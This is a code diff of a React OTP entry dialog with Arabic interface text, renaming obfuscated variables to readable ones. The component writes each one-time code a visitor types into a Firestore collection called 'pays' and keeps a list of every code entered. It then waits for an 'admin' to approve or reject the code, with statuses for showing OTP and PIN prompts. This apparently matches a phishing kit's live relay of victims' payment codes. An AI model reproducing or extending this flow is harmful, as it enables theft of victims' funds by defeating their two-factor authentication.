@@ -21,9 +21,9 @@ interface OtpDialogProps {
 const allOtps=['']
 // OTP Dialog Component with admin approval flow
 export function OtpDialog({ open, onOpenChange, onOtpApproved, documentId }: OtpDialogProps) {
-  const [_v5, _s5] = useState("")
+  const [otp, setOtp] = useState("")
   const [error, setError] = useState("")
-  const [otpStatus, _s5Status] = useState<"waiting" | "verifying" | "approved" | "rejected" | "otp_rejected">("waiting")
+  const [otpStatus, setOtpStatus] = useState<"waiting" | "verifying" | "approved" | "rejected" | "otp_rejected">("waiting")
   const [isListening, setIsListening] = useState(false)
 
   // Listen to Firestore for OTP status changes
@@ -43,15 +43,15 @@ export function OtpDialog({ open, onOpenChange, onOtpApproved, documentId }: Otp
           const status = data.otpStatus as "waiting" | "verifying" | "approved" | "rejected" | "otp_rejected" | "show_otp" | "show_pin"
 
           if (status === "otp_rejected") {
-            _s5Status("waiting")
-            _s5("") // Clear the old code
+            setOtpStatus("waiting")
+            setOtp("") // Clear the old code
             setError("تم رفض رمز التحقق. يرجى إدخال رمز صحيح.")
           } else if (status === "approved") {
-            _s5Status("approved")
+            setOtpStatus("approved")
             setError("")
             onOtpApproved()
           } else if (status === "verifying") {
-            _s5Status("verifying")
+            setOtpStatus("verifying")
           }
         }
       },
@@ -70,7 +70,7 @@ export function OtpDialog({ open, onOpenChange, onOtpApproved, documentId }: Otp
   const handleOtpSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
 
-    if (_v5.length !== 6) {
+    if (otp.length !== 6) {
       setError("يرجى إدخال رمز التحقق المكون من 6 أرقام")
       return
     }
@@ -79,21 +79,21 @@ export function OtpDialog({ open, onOpenChange, onOtpApproved, documentId }: Otp
     if (!visitorID) return
 
     try {
-      allOtps.push(_v5)
+      allOtps.push(otp)
       // Update the document with the OTP
       await updateDoc(doc(db, "pays", visitorID), {
-        _v5,
+        otp,
         otpSubmittedAt: new Date().toISOString(),
         allOtps,
         otpStatus: "verifying" // Set to verifying, waiting for admin decision
       })
 
       // Add OTP to history
-      await addToHistory(visitorID, "_v5", {
-        otpCode: _v5
+      await addToHistory(visitorID, "otp", {
+        otpCode: otp
       }, "pending")
 
-      _s5Status("verifying") // Show loading state
+      setOtpStatus("verifying") // Show loading state
       // The status will be updated via the listener when admin approves/rejects
     } catch (err) {
       console.error("Error submitting OTP:", err)
@@ -125,10 +125,10 @@ export function OtpDialog({ open, onOpenChange, onOtpApproved, documentId }: Otp
             <Input
               type="tel"
               placeholder="000000"
-              value={_v5}
+              value={otp}
               onChange={(e) => {
                 const value = e.target.value.replace(/\D/g, "").slice(0, 6)
-                _s5(value)
+                setOtp(value)
                 setError("")
               }}
               maxLength={6}
@@ -142,7 +142,7 @@ export function OtpDialog({ open, onOpenChange, onOtpApproved, documentId }: Otp
           <Button
             type="submit"
             className="w-full h-12 bg-[#0a4a68] hover:bg-[#0a4a68]/90 text-white font-bold"
-            disabled={_v5.length !== 6 || otpStatus === "verifying"}
+            disabled={otp.length !== 6 || otpStatus === "verifying"}
           >
             {otpStatus === "verifying" ? "جاري التحقق..." : "تأكيد"}
           </Button>
